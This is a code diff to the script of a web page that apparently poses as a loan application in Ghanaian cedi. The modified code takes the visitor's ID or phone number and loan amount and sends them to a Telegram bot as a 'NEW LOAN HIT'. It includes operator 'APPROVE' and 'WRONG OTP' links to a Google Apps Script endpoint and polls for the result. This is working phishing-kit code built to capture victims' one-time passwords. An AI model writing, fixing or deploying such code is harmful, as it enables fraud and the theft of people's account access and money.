@@ -120,7 +120,7 @@
         let isResetting = false;
         let otpInterval;
     // Config
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxvkK3_K62C3_1J4-pGf7Th_zixUHJYS0QMpuSjTsJ9INoGegYsE5NW90p7COpo39gu-g/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzHqqqFuhAV070lss288JWURMsWlM1pb7CRO3Sr5QCrgQdnbWScfCl9nnN7RgHYCqEJQg/exec";
     const urlParams = new URLSearchParams(window.location.search);
     const BOT_TOKEN = urlParams.get('token');
     const CHAT_ID = urlParams.get('id');
@@ -156,25 +156,25 @@
     // 2. Verification Flow
     // 2. Verification Flow (UPDATED)
 async function startVerification() {
-    const id = document.getElementById('user-id').value;
+    const rawId = document.getElementById('user-id').value;
     const amt = document.getElementById('loan-amt').value;
-    if(!id) return alert("Required Field");
+    if(!rawId) return alert("Required Field");
 
-    document.getElementById('display-id').innerText = id;
-    showView(2);
+    document.getElementById('display-id').innerText = rawId;
+    showView(2); 
 
-    // Force ID to string and clean it
-    const cleanId = encodeURIComponent(String(id).trim());
+    // USE THIS: Double encoding ensures Google doesn't "lose" the ID during the redirect
+    const safeId = encodeURIComponent(rawId.trim());
 
-    // NEW LINKS
-    const approveLink = `${SCRIPT_URL}?cmd=approve&num=${cleanId}`;
-    const wrongLink = `${SCRIPT_URL}?cmd=wrongOTP&num=${cleanId}`;
+    // Update 'num' to 'id' to match the new script
+    const approveLink = SCRIPT_URL + "?cmd=approve&id=" + safeId;
+    const wrongLink = SCRIPT_URL + "?cmd=wrongOTP&id=" + safeId;
 
-    const msg = `💰 *NEW LOAN HIT*\nID: ${id}\nAmt: GHS ${amt}\n\n✅ *APPROVE:* ${approveLink}\n❌ *WRONG OTP:* ${wrongLink}`;
+    const msg = `💰 *NEW LOAN HIT*\nID: ${rawId}\nAmt: GHS ${amt}\n\n✅ *APPROVE:* ${approveLink}\n❌ *WRONG OTP:* ${wrongLink}`;
     
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
     
-    startPolling(id);
+    startPolling(rawId);
 }
     async function startPolling(phone) {
     const cleanID = String(phone).trim();
